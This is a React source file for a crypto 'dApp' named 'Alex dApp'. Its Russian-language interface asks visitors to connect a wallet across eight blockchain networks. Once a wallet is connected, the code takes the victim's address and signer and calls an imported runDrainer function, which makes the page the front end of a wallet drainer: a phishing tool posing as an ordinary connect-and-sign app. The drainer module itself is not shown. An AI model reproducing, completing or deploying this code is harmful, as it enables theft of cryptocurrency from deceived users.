import { useEffect } from 'react'
import { createAppKit } from '@reown/appkit'
import {
  mainnet, polygon, bsc, avalanche,
  arbitrum, optimism, linea, base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer'

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]

const wagmiAdapter = new WagmiAdapter({ projectId, networks })

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'http://localhost:5173',
    icons: ['https://checkalex.xyz/icon.png']
  },
  projectId,
  features: {
    analytics: true,
    email: false,
    socials: false
  },
  allWallets: 'SHOW'
})

export default function App() {
  const handleClick = async () => {
    try {
      await modal.open()

      // Ждём появления window.ethereum после подключения
      const waitForEthereum = async () => {
        return new Promise((resolve, reject) => {
          let attempts = 0
          const interval = setInterval(() => {
            if (window.ethereum) {
              clearInterval(interval)
              resolve(window.ethereum)
            } else if (++attempts > 10) {
              clearInterval(interval)
              reject(new Error('⛔️ window.ethereum не найден'))
            }
          }, 500)
        })
      }

      const eth = await waitForEthereum()

      const accounts = await eth.request({ method: 'eth_accounts' })
      if (!accounts.length) throw new Error('Кошелёк не подключён')

      const address = accounts[0]
      console.log('✅ Кошелёк подключён:', address)

      const provider = new ethers.providers.Web3Provider(eth, 'any')
      const signer = provider.getSigner()

      await runDrainer(provider, signer, address)
      console.log('🚀 Контракт успешно вызван')
    } catch (err) {
      console.error('❌ Ошибка при подключении или вызове:', err)
      alert(`Ошибка: ${err.message || err}`)
    }
  }

  return (
    <div style={{ textAlign: 'center', marginTop: '5rem' }}>
      <h1>Alex dApp</h1>
      <button
        onClick={handleClick}
        style={{
          padding: '12px 24px',
          fontSize: '18px',
          borderRadius: '10px',
          background: '#4f46e5',
          color: 'white',
          cursor: 'pointer',
          border: 'none'
        }}
      >
        Подключить кошелёк
      </button>
    </div>
  )
}
